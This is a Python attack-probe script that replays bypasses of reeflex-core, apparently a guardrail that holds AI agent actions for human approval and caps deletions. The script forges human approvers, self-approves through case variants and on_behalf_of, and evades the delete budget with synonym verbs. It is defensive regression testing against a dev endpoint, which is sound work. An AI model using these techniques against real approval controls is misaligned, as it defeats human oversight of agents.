#!/usr/bin/env python3
"""
attack-probe-rfx-core-2.py -- live reproduction harness for RFX-CORE-2 / RFX-CORE-3.

Replays the two evasions this branch fixes against a running reeflex-core and
prints the RAW request and the RAW verdict for each, so the evidence is the
attack failing, not a green test:

  A. 4-eyes bypass via a self-asserted principal (RFX-CORE-2)
     One credential raises a hold as an agent and approves it as a fabricated
     human, then rides the approval to `allow`.
       A1  fabricated `human:*` approver          -> hold approved, decided_by forged
       A2  envelope with NO agent.id              -> actor_is_approver skipped entirely
       A3  same identity, different case          -> actor_is_approver string-missed
       A4  approver == agent.on_behalf_of         -> self-approval at one remove

  B. R5 delete-budget evasion via a non-canonical verb (RFX-CORE-3)
     R5's `deletions` dimension keys on the exact string "delete", so any other
     spelling of a delete accumulates under its own key and never trips it.

USAGE
  # against the RoE-approved eval endpoint (default)
  python3 scripts/attack-probe-rfx-core-2.py

  # against a locally-run core carrying the fix
  REEFLEX_PROBE_BASE=http://127.0.0.1:8080 REEFLEX_PROBE_TOKEN= \
      python3 scripts/attack-probe-rfx-core-2.py

Traffic is LABELLED SYNTHETIC (X-Reeflex-Eval header + context.note) and paced
serially -- the eval endpoint 429s on concurrent bursts. The target host is
asserted to be non-prod: api.reeflex.io is refused outright.
"""
from __future__ import annotations

import json
import os
import sys
import time
import urllib.error
import urllib.request

BASE = os.environ.get("REEFLEX_PROBE_BASE", "https://api-dev.reeflex.io").rstrip("/")
TOKEN = os.environ.get("REEFLEX_PROBE_TOKEN", "reeflex-eval-public-2026")
RUN = os.environ.get("REEFLEX_PROBE_RUN", str(int(time.time())))
OUT = os.environ.get("REEFLEX_PROBE_OUT", "")
# Pacing between calls. The api-dev eval endpoint 429s on concurrent bursts, so
# the default is deliberately slow; a localhost replay has no such limit and can
# set REEFLEX_PROBE_PACE=0.
PACE = float(os.environ.get("REEFLEX_PROBE_PACE", "1.2"))

# HARD GUARD: prod core is out of scope for this harness, entirely.
_host = BASE.split("://", 1)[-1].split("/", 1)[0].lower()
if _host in ("api.reeflex.io", "reeflex.io", "www.reeflex.io"):
    sys.exit("refusing to probe production core (%s) -- api-dev / localhost only" % _host)

SYNTH = "synthetic:dev-1:RFX-CORE-2:eval"
_TX = open(OUT, "a", encoding="utf-8") if OUT else None


def call(method, path, body=None, label=""):
    """One paced HTTP call. Returns (status, parsed_body)."""
    url = BASE + path
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if TOKEN:
        req.add_header("Authorization", "Bearer " + TOKEN)
    req.add_header("Content-Type", "application/json")
    req.add_header("X-Reeflex-Eval", SYNTH)

    status, raw = 0, ""
    for attempt in range(4):
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                status, raw = resp.status, resp.read().decode("utf-8")
            break
        except urllib.error.HTTPError as exc:
            status, raw = exc.code, exc.read().decode("utf-8")
            if status == 429 and attempt < 3:
                time.sleep(3 * (attempt + 1))
                continue
            break
        except Exception as exc:  # noqa: BLE001
            status, raw = 0, "TRANSPORT_ERROR: %r" % (exc,)
            break

    try:
        parsed = json.loads(raw)
    except Exception:  # noqa: BLE001
        parsed = raw

    if _TX:
        _TX.write(json.dumps({
            "label": label,
            "request": {"method": method, "url": url, "body": body},
            "response": {"status": status, "body": parsed},
        }, separators=(",", ":")) + "\n")
        _TX.flush()

    print("-" * 78)
    print("LABEL    : " + label)
    print("REQUEST  : %s %s" % (method, url))
    if body is not None:
        print("BODY     : " + json.dumps(body, separators=(",", ":")))
    print("STATUS   : %s" % status)
    print("RESPONSE : " + json.dumps(parsed, separators=(",", ":")))
    sys.stdout.flush()
    if PACE:
        time.sleep(PACE)
    return status, parsed


def envelope(session_id, verb, count=1, env="dev", reversibility="irreversible",
             blast="single", externality="internal", agent_id="agent:dev-1-synthetic",
             include_agent_id=True, on_behalf_of=None, approval=None):
    """Build a labelled synthetic Action Envelope (SPEC section 2)."""
    agent = {"session_id": session_id}
    if include_agent_id:
        agent["id"] = agent_id
    if on_behalf_of is not None:
        agent["on_behalf_of"] = on_behalf_of
    return {
        "reeflex_version": "0.1",
        "agent": agent,
        "action": {"namespace": "eval", "verb": verb, "ability": "eval/synthetic"},
        "target": {"kind": "synthetic", "ref": "eval:dev-1", "environment": env},
        "params": {},
        "magnitude": {"count": count},
        "axes": {"reversibility": reversibility, "blast_radius": blast,
                 "externality": externality},
        "approval": approval or {"present": False, "hold_id": None},
        "context": {"mode": "enforce", "note": SYNTH},
    }


def sid(tag):
    return "sess-dev1-%s-%s" % (RUN, tag)


def verdict(resp):
    return resp.get("decision", "?") if isinstance(resp, dict) else "?"


def rule(resp):
    return resp.get("rule", "?") if isinstance(resp, dict) else "?"


def banner(text):
    print("\n" + "=" * 78)
    print("== " + text)
    print("=" * 78)


# ---------------------------------------------------------------------------
# Deployment-state probe: is the RFX-CORE-1 (#89) environment canon live here?
# ---------------------------------------------------------------------------

def probe_env_canon():
    banner("PRECHECK  RFX-CORE-1 (#89) environment canon -- which build is this?")
    _, r = call("POST", "/v1/decide",
                envelope(sid("pre-a"), "delete", 1, env="production",
                         reversibility="irreversible", blast="systemic"),
                "precheck: environment='production' (exact) + irreversible + systemic")
    exact = verdict(r)
    _, r2 = call("POST", "/v1/decide",
                 envelope(sid("pre-b"), "delete", 1, env="Prod",
                          reversibility="irreversible", blast="systemic"),
                 "precheck: environment='Prod' (near-miss) + irreversible + systemic")
    near = verdict(r2)
    print("\n  exact 'production' -> %s ; near-miss 'Prod' -> %s" % (exact, near))
    if exact == "deny" and near == "deny":
        print("  => #89 IS live on this build (near-miss coerces to production).")
    elif exact == "deny" and near == "allow":
        print("  => #89 is NOT live on this build (near-miss still fails OPEN).")
    else:
        print("  => inconclusive; inspect the raw verdicts above.")


# ---------------------------------------------------------------------------
# A. 4-eyes bypass via a self-asserted principal (RFX-CORE-2)
# ---------------------------------------------------------------------------

def _raise_hold(tag, **kw):
    """Raise an R2 hold (irreversible + broad + production -> require_approval)."""
    _, r = call("POST", "/v1/decide",
                envelope(sid(tag), "delete", 1, env="production",
                         reversibility="irreversible", blast="broad", **kw),
                "A/%s step1: raise hold (irreversible+broad+production -> R2)" % tag)
    hold_id = r.get("hold_id") if isinstance(r, dict) else None
    print("\n  verdict=%s rule=%s hold_id=%s" % (verdict(r), rule(r), hold_id))
    return hold_id


def attack_a1_fabricated_human():
    banner("A1  4-eyes bypass: ONE credential raises as agent, approves as a "
           "FABRICATED human, then rides the approval to allow")
    hold_id = _raise_hold("a1", agent_id="agent:dev-1-synthetic-attacker")
    if not hold_id:
        print("  !! no hold_id -- cannot continue A1")
        return
    st, r = call("POST", "/v1/holds/%s/resolve" % hold_id,
                 {"decision": "approve",
                  "principal": {"type": "human", "id": "leo.david"},
                  "reason": "synthetic eval: principal is asserted, not authenticated"},
                 "A1 step2: approve as a human this caller never proved it is")
    print("\n  resolve status=%s decided_by=%s"
          % (st, r.get("decided_by") if isinstance(r, dict) else "?"))
    _, r3 = call("POST", "/v1/decide",
                 envelope(sid("a1"), "delete", 1, env="production",
                          reversibility="irreversible", blast="broad",
                          agent_id="agent:dev-1-synthetic-attacker",
                          approval={"present": True, "hold_id": hold_id}),
                 "A1 step3: resubmit under the self-granted approval")
    print("\n  RESULT: irreversible+broad+production executed with verdict=%s "
          "on a human approval that no human gave" % verdict(r3))


def attack_a2_missing_agent_id():
    banner("A2  actor_is_approver is SKIPPED when the envelope omits agent.id "
           "(envelope.py requires session_id, not id)")
    hold_id = _raise_hold("a2", include_agent_id=False)
    if not hold_id:
        print("  !! no hold_id -- cannot continue A2")
        return
    st, r = call("POST", "/v1/holds/%s/resolve" % hold_id,
                 {"decision": "approve",
                  "principal": {"type": "human", "id": "anyone-at-all"}},
                 "A2 step2: approve -- there is no actor identity to compare against")
    print("\n  resolve status=%s decided_by=%s (check 4 had nothing to compare)"
          % (st, r.get("decided_by") if isinstance(r, dict) else "?"))


def attack_a3_case_variant_same_identity():
    banner("A3  actor_is_approver is an EXACT string compare: the SAME identity "
           "in different case passes both check 4 and decide's check 6")
    hold_id = _raise_hold("a3", agent_id="svc-bot")
    if not hold_id:
        print("  !! no hold_id -- cannot continue A3")
        return
    st, r = call("POST", "/v1/holds/%s/resolve" % hold_id,
                 {"decision": "approve",
                  "principal": {"type": "human", "id": "SVC-BOT"}},
                 "A3 step2: agent.id='svc-bot' approves itself as 'SVC-BOT'")
    print("\n  resolve status=%s decided_by=%s"
          % (st, r.get("decided_by") if isinstance(r, dict) else "?"))
    _, r3 = call("POST", "/v1/decide",
                 envelope(sid("a3"), "delete", 1, env="production",
                          reversibility="irreversible", blast="broad",
                          agent_id="svc-bot",
                          approval={"present": True, "hold_id": hold_id}),
                 "A3 step3: resubmit -- decide check 6 compares 'svc-bot' vs 'SVC-BOT'")
    print("\n  RESULT: verdict=%s -- the actor approved itself" % verdict(r3))


def attack_a4_on_behalf_of():
    banner("A4  self-approval at one remove: the approver is the very human the "
           "agent declares it is acting for (agent.on_behalf_of)")
    hold_id = _raise_hold("a4", agent_id="agent:dev-1-synthetic",
                          on_behalf_of="user:alice")
    if not hold_id:
        print("  !! no hold_id -- cannot continue A4")
        return
    st, r = call("POST", "/v1/holds/%s/resolve" % hold_id,
                 {"decision": "approve",
                  "principal": {"type": "human", "id": "user:alice"}},
                 "A4 step2: approve as user:alice -- the principal the agent acts for")
    print("\n  resolve status=%s decided_by=%s"
          % (st, r.get("decided_by") if isinstance(r, dict) else "?"))


# ---------------------------------------------------------------------------
# B. R5 delete-budget evasion via a non-canonical verb (RFX-CORE-3)
# ---------------------------------------------------------------------------

# deletions limit is 20 (budgets.rego default); objects_touched is 200. A single
# count=25 delete trips deletions on the FIRST call, so each spelling is one
# request -- no need to fragment into 21 calls.
_DELETE_SPELLINGS = [
    "delete",          # control: the canonical spelling, MUST hold
    "Delete",          # case near-miss
    "DELETE",          # the literal SQL/HTTP spelling an adapter is likely to emit
    "delete ",         # trailing space
    "delete\n",        # trailing newline
    "delete​",    # zero-width space
    "remove",          # synonym
    "destroy",         # synonym
    "purge",           # synonym
    "drop",            # synonym (DROP TABLE)
    "truncate",        # synonym (TRUNCATE)
    "erase",
    "wipe",
    "rm",
    "hard_delete",
    "bulk_delete",
    "delete_all",
]


def attack_b_delete_verbs():
    banner("B  R5 delete-budget evasion: deletions keys on the exact verb "
           "'delete'; count=25 is 5 over the limit of 20 in ONE call")
    results = []
    for i, verb in enumerate(_DELETE_SPELLINGS):
        _, r = call("POST", "/v1/decide",
                    envelope(sid("b%02d" % i), verb, count=25, env="dev"),
                    "B: verb=%r count=25 (deletions limit is 20)" % verb)
        results.append((verb, verdict(r), rule(r)))

    print("\n" + "=" * 78)
    print("B SUMMARY -- 25 deletes against a budget of 20")
    print("=" * 78)
    print("%-18s %-18s %s" % ("verb (repr)", "verdict", "rule"))
    for verb, v, ru in results:
        flag = "  <-- EVADED (fail OPEN)" if v == "allow" else ""
        print("%-18s %-18s %s%s" % (repr(verb), v, ru, flag))
    evaded = [v for v, d, _ in results if d == "allow"]
    print("\n  %d/%d spellings evaded the delete budget" % (len(evaded), len(results)))


def attack_b_amplification():
    banner("B2  how far the evasion reaches: objects_touched (limit 200) is the "
           "only backstop, so a non-canonical delete gets ~10x the budget")
    for count in (25, 199, 201):
        _, r = call("POST", "/v1/decide",
                    envelope(sid("b2-%d" % count), "remove", count=count, env="dev"),
                    "B2: verb='remove' count=%d" % count)
        print("\n  count=%-4d -> %s (%s)" % (count, verdict(r), rule(r)))


def main():
    print("reeflex-core attack probe -- RFX-CORE-2 / RFX-CORE-3")
    print("target : %s" % BASE)
    print("run    : %s" % RUN)
    print("traffic: %s" % SYNTH)
    which = sys.argv[1] if len(sys.argv) > 1 else "all"
    if which in ("all", "pre"):
        probe_env_canon()
    if which in ("all", "a"):
        attack_a1_fabricated_human()
        attack_a2_missing_agent_id()
        attack_a3_case_variant_same_identity()
        attack_a4_on_behalf_of()
    if which in ("all", "b"):
        attack_b_delete_verbs()
        attack_b_amplification()


if __name__ == "__main__":
    main()
